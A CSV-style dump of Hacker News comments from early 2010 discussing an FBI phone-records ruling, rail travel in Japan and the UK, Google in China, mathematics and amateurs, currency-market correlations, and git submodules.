1070519,comment,1070232,1070232,0,0,GiraffeNecktie,,,"Well I call bullshit on this whole story. From the linkbait heading to the complete distortion of the facts of the ruling. If you actually read the ruling (ok I just skimmed through it but I'm pretty sure I got a much better grip than this blogger who is only commenting on a Wired article which itself seems wildly biased and inaccurate) the whole point of the ruling is to determine whether the FBI acted improperly and the conclusion of the ruling is that yes they did act improperly. I can't see anywhere that it says that breaking the law is legal, as this blogger claims. Perhaps I'm mistaken and someone could point this out to me but I don't see it. As for the linkbait heading. It's ALWAYS been legal for the FBI to access phone records. That is, after all, what police do these days. There are two relevant questions: did they follow proper legal procedure (the answer is no) and are they allowed to continue flaunting the law (the answer is again no).  So what's up with this heading of ""It's legal for the FBI to access phone records""? Of course it's legal, if they follow the law and it's not legal if they don't. Sounds reasonable to me.",1264190149

Japans interurban trains are both heavily subsidized <i>and</i> expensive - they're more comparable to air travel than any trains in America.<p>As for their subways, I'd guess it's because of density and parking.  The special wards of Tokyo (<a href=""http://en.wikipedia.org/wiki/Special_wards_of_Tokyo"" rel=""nofollow"">http://en.wikipedia.org/wiki/Special_wards_of_Tokyo</a>) are roughly equivalent to NYC - 8.8 million people, historic core, not including the suburbs or greater metro area.  The only difference is it's in half the land area.  So the whole special wards is twice as dense as NYC as a whole or about the same density as Brooklyn.<p>Looking at the largest cities in the USA (<a href=""http://en.wikipedia.org/wiki/List_of_United_States_cities_by_population"" rel=""nofollow"">http://en.wikipedia.org/wiki/List_of_United_States_cities_by...</a>) vs largest cities in Japan (<a href=""http://en.wikipedia.org/wiki/Largest_cities_in_Japan"" rel=""nofollow"">http://en.wikipedia.org/wiki/Largest_cities_in_Japan</a>) #1-4 are a perfect match and 1-10 are all pretty close in size, but I'm pretty sure Nagoya and Sapporo are much more dense than Houston and Phoenix.

At the same time there is a lot of great research that has been which has real and important implications.</i><p>My wife and I were discussing this recently.  She is in an unusual program where she should graduate with both a masters in history and an education certificate with hopes to teach in history at the High School level after that.<p>This is both second hand an anecodatal, but from what she tells me the education courses she takes are less rigorous and generally easier than the history courses.  But the reason for this is that the education course she is taking are vocational. They are trying to teach her how to get teaching done in a modern classroom, not the science behind it.<p>It is akin to learning to the difference between training to be a mechanic and a mechanical engineer.  Both are very hard and important jobs worthy of respect, but they have very different focuses.  The education courses are focused on learning the technique of teaching effective, it looks like most of the research on the theory of effective education is done in departments like psychology, sociology, etc.",1264189993

1070509,comment,1069655,1070400,0,0,grandalf,,,"On the first point:  For the average Chinese person, simply having an awareness of government censorship is <i>a good thing</i>.  Google is taking this away.  The censorship isn't perfect... for example how many times do you think the full WikiPedia is brought into China on laptops every day?  I'd guess dozens per day.  Google is suffering the ""Napster Problem"", they are easily vulnerable to a centralized attack (in this case blocking IPs)... but before and after Napster people still got all the illicit mp3s they wanted.<p>On the second point, the economic argument would be: If China were not subsidizing its export industry, the dollars currently used to buy US Treasuries would have likely been spent on useful goods and services.  Instead, it effectively sat idle and could not be used to invest in infrastructure, etc.  You can point to the result and say it worked, but China has a natural competitive advantage in manufacturing, so it's hard to say how much benefit the policy caused; the harm is easier to imagine.<p>(China probably has some sensible reasons for promoting mercantilist policies, but it's inevitable that they lower prosperity over all and amount to a transfer from one group within china to another.  This is the same sort of tradeoff we experience it the US with a wide variety of policies, notably agriculture policy).",1264189903

1070505,comment,1070499,1070499,0,0,dennykmiu,,,"Ever since I graduated from college, I have been fired from every job I ever had. Each time, I decided that the timing was right for me to start my own company. In retrospect, I failed whenever I focused entirely on my ""vision"" and succeeded when I learned to rely on my ""peripheral"" vision. This is a tough time to be an entrepreneur. It is too easy to think of the current downturn as just another economic setback. Instead, we need to think of this as the end of a 60-year cycle. Since 1949, the Chinese have been lifting themselves by their bootstraps, initially with their communist ideology but eventually by manufacturing low-cost consumer products and by reinvesting their earnings in foreign debts to keep interest rate artificially low (sort of like the Opium War in reverse). Now there are two World powers competing for markets and resources, fundamentally changing the long-term prospect of the American middle class. But for every crisis, there is an opportunity. Going forward I encourage all bootstrapping entrepreneurs to be patient, to keep an eye on the peripherals and to maintain discipline by consistently ask ourselves these really tough 20 questions (I find the YouTube video to be inspiring). This is not a race. When my son and I climbed Kilimanjaro last year, the porters would constantly sing in Swahili, ""Haraka haraka haina baraka, Pole pole ndio mwendo"", meaning ""hurry hurry has no blessing, slowly slowly the world moves.""

I'm not sure whether we can say that rail travel is profitable here, it still receives substantial government subsidy each year, but it is successful in that last year saw a record number of rail journeys taken.<p>I'm not sure what the parking situation is like in the US but here if you work in a major city car parking will cost you at least $100-150 per month, London is much more expensive. A lot of our suburban railway stations allow free or discount parking so even if you can't make your entire journey by train you can park and travel into the city by rail.<p>When it comes to longer journeys the tickets are sold on a reverse pricing basis, if you buy in advance the first 10-20% of tickets for a train are sold at the cheapest rate, sometimes a 200 mile journey costs as little as $20. If you buy a ticket on the day and during a peak period you'll pay a lot more. This structure however seems to result in more of the trains being full more of the time as pricing reflects the demand.<p>Also faster trains all fitted with wifi make longer journeys much more simple. I often travel into London and buy an advance ticket that costs around £25 ($35 ish)the train at 125mph takes half the journey time of the car and you avoid parking charges and the london congestion charge. I also get to work the entire journey for a similar cost to the fuel alone. It really is a complete no-brainer, you'd have to be stupid to want to drive.<p>That is I suppose a long reason for a simple answer.

I am currently a math grad student, and while I am only a grad student what I have seen of the mathematical community makes it seem like it is very open to cross fertilization from other sciences and from amateurs.<p>Admittedly he is historical, but Fermat (professional judge when he did most of his mathematical work) is revered and there are some more recent amateurs that have made genuine contributions.  Much of mathematics is inspired by other fields such as physics.<p>I admit I know some professional mathematicians were tired of finding flaws in amateurs proofs of Fermat's Last Theorem and rebuting supposed refutations of Godel's diagonal proof that the reals are uncountable, but it is very different to be tired of dealing with a constant stream like that than to be hostile towards outsiders in general.<p>From my limited perspective, I think math is one of the fields most open to outsiders and amateurs coming in and making real contributions, both culturally and in the fact that we rarely need expensive experimental setups so the barrier of entry (in terms of money and equipment) is low.",1264189557

That and a nickel and a time machine will get you a cup of coffee.</i><p>And the real question then is, did the overall markets fall because of Obama's comments, or because of dollar strength and the widening of Greek CDS spreads? Since materials have a higher weighting in the market, would we not assume the latter?<p><i>There is a near-perfect inverse correlation between the value of the dollar and the market</i><p>That correlation started around 2H2008. Correlation running about -.5... nowhere near perfect; however, historically we have a positive correlation. Source: <a href=""http://bit.ly/spycorr"" rel=""nofollow"">http://bit.ly/spycorr</a> The liquidity infusions that the market has seen has very little to do with U.S. politics.<p><i>You can creepily see this happening on a tick-by-tick basis. I don't know why this is so perfect, but I suspect it almost has to be algos doing it. This is the kind of thing that the government (may) start regulating.</i><p>This happens due to capital inflows/outflows from different markets. If capital flows out of bonds, it most likely goes into stocks, which gives us this ""creepy"" movement... but there's nothing sinister behind it. Algorithmic trading has little to do with this, if at all.<p>One quick note: UUP is probably the worst tracker of dollar strength. It's an etf that is structurally damaged and has contract rollover issues due to it's exposure in front month dollar future contracts. I would suggest DXY or looking at a basket of currencies.",1264187564

We do the same thing, all the way down to storing tarballs of software-packages a project depends on - it <i>is</i> the right way. The blame is on git here for not supporting it better. I.e. it should be much easier to selectively truncate history or even define an object-level attribute like ""Only keep the last 3 versions of this"".<p>Regardless we're getting along with git quite well, despite .git sizes in the gigabytes for some projects.<p>Our main complaints about git are access control and sub-projects at this point.<p>Subprojects (""submodules"") in git are a royal pain in the ass. I consider them broken-by-design. A simple equivalent to svn-externals would work so much better...<p>This, combined with the complete lack of directory based access control, makes it rather cumbersome to work with ""partially trusted"" third parties in a commercial setting. We don't want to open our entire repository to some temporary contractor.
